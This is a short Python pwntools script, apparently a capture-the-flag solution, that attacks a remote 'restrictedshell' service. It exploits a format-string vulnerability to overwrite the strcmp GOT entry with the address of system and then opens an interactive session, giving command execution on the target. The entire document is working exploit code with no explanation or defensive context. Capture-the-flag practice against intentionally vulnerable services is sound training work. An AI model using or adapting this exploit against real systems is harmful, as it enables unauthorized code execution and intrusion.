from pwn import *

exe = context.binary = ELF('./restrictedshell')
io = remote('ctf.hackucf.org', 7007)
def findSet(payload):
    #io.recvuntil(b'#')
    io.sendline(b'prompt')
    io.recvuntil(b'string: ', timeout=3)
    log.info("payload = %s" % repr(payload))
    io.sendline(payload + b'###') 
    return io.recvuntil(b'#').strip()

io.sendline(b'prompt\n###')
fmt = FmtStr(execute_fmt=findSet, offset=5)
fmt.write(exe.got['strcmp'], exe.plt['system'])
fmt.execute_writes()
io.interactive()